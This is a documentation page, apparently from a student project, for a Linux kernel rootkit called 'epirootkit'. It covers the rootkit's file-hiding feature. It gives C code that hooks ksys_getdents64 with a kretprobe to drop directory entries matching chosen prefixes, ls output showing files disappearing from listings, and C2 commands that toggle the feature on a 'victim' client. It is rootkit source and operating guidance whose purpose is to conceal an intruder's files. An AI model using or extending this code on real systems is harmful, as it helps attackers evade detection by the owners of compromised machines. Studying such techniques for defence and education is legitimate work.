---
title: "File Hiding"
description: "Hide files and directories from directory listings using syscall interception"
icon: "folder_off"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 515
---
{{< alert context="warning" text="It's Tuesday 17/06 21:26, two hours before deadline, and I'm realizing just now that even with file hiding enabled, the directory `/sys/module/epirootkit` is still visible in the victim's system. This occurs because we only hook getdents while `/sys/module/epirootkit` uses sysfs." />}}

## Implementation

```c
static const char * const hide_prefixes[] = { 
    "epirootkit",
    "jules_est_bo_", 
};

file_hiding_state.getdents_probe = (struct kretprobe) {
    .kp.symbol_name = "ksys_getdents64",
    .handler = getdents64_ret_handler,
    .entry_handler = getdents64_entry_handler,
    .data_size = sizeof(struct getdents_context),
    .maxactive = 20
};
```

Hooks `ksys_getdents64` syscall and filters directory entries matching hidden prefixes.

## Testing

```bash
# Create test files
touch /tmp/epirootkit_test.txt /tmp/normal_file.txt

# Without file hiding
ls /tmp/
# Output: epirootkit_test.txt  normal_file.txt

# With file hiding enabled
ls /tmp/
# Output: normal_file.txt
```

## Control

### WebUI
Toggle via **[Configuration Panel](../../04-web-ui/features/panels/configuration-panel.md)**

### C2 Commands
```bash
enable-file-hiding Client-1    # Enable hiding
disable-file-hiding Client-1   # Disable hiding
status Client-1                # Check state
```

Files remain accessible by full path - only directory listings are filtered. 